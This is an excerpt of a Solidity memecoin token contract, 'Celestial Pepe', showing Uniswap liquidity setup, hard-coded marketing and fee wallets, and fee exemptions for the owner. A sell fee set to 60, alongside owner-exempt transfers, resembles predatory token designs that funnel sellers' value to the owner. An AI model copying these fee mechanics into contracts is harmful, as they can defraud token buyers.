...
// Telegram: https://t.me/Tpepe_er20
// Twitter: https://twitter.com/Tpepe_ERC20
...
contract CelestialPepe is ERC20, Ownable {

    using SafeMath for uint256;

    uint256 _totalSupply = 690_000_000_000 * 1e18;
    ...
    uint256 private liquidityAmount = (_totalSupply * 96) / 100;
    ...
    uint256 public sellFees = 60;

    uint256 public marketing = 50;
    uint256 public feeCollector = 50;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    address public constant deadAddress = address(0xdead);

    address public marketingWallet = address(0x1230161e6500b4d6de8A8FA0A2daeA0f69d2e413);

    address public feeWallet = address(0xad0d60FF2d23BdD1069A4F4f07a4B73E243e6860);
    ...
    constructor() ERC20("Celestial Pepe", "T-PEPE") {
        // exclude from paying fees
        removeFromFees(owner(), true);
        removeFromFees(marketingWallet, true);
        removeFromFees(feeWallet, true);
        removeFromFees(address(this), true);
        removeFromFees(address(0xdead), true);

        // exclude from max transaction limit
        removeFromMaxTxn(owner(), true);
        removeFromMaxTxn(marketingWallet, true);
        removeFromMaxTxn(feeWallet, true);
        removeFromMaxTxn(address(this), true);
        removeFromMaxTxn(address(0xdead), true);
    ...
    function addLiquidity() external payable onlyOwner {
        ...
        removeFromMaxTxn(address(_uniswapV2Router), true);
        _approve(address(this), address(uniswapV2Router), totalSupply());

        // add the liquidity
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        removeFromMaxTxn(address(uniswapV2Pair), true);
    ...
    function swapBack() private {
        ...
        if (contractBalance >= swapTokensAtAmount) {
            ...
            (success, ) = address(feeWallet).call{value: amountToDev}("");
